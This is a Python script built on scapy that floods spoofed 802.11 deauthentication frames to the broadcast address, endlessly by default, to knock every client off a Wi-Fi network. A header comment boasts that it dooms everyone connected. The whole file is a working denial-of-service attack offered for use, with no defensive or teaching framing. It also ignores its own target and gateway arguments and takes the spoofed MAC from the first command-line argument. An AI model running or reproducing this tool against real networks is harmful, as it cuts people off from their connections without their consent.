#!/usr/bin/env python
#DOOMED EVERYONE THAT IS CONNECTED TO YOU

from scapy.all import *
import sys
import threading

def deauth(target_mac,gateway_mac,inter=0.1,count=None,loop=1,iface="wlo1mon",verbose=1):
  broadcast_mac="ff:ff:ff:ff:ff:ff" #ALL TARGET_MAC
  packet=RadioTap()/Dot11(addr1=broadcast_mac,addr2=sys.argv[1],addr3=sys.argv[1])/Dot11Deauth() 
  sendp(packet, inter=inter, count=count, loop=loop, iface=iface, verbose=verbose)  #SENDING PACKETS..........

if __name__ == '__main__':
    import argparse
    parser=argparse.ArgumentParser(description="Simple Python tool to remove user from wifi")
    parser.add_argument("target",help="TARGET MAC-ADDRESS")
    parser.add_argument("gateway",help="GATEWAY MAC-ADDRESS AUTHENTICATED WITH")
    parser.add_argument("-c","--count",help="Number of Deauth frames that you needed",default=0)
    parser.add_argument("--interval",help="Sending frequency at 100ms",default=0.1)
    parser.add_argument("-i",dest="iface",help="Name of Interface",default="wlo1mon")
    parser.add_argument("-v","--verbose",help="Print Messages",action="store_true")
    args=parser.parse_args()
    target=args.target
    gateway=args.gateway
    count=int(args.count)
    interval=float(args.interval)
    iface=args.iface
    verbose=args.verbose

    if count == 0:
        #it will go for infinite times
      loop = 1
      count = None
    else:
      loop=0
    if verbose:
      if count:
        print("Sending %s's for %s's interval" %(count,interval))
      else:
        print("Sending for %s's interval forerver...." %(interval))
    deauth(target,gateway,interval,count,loop,iface,verbose)
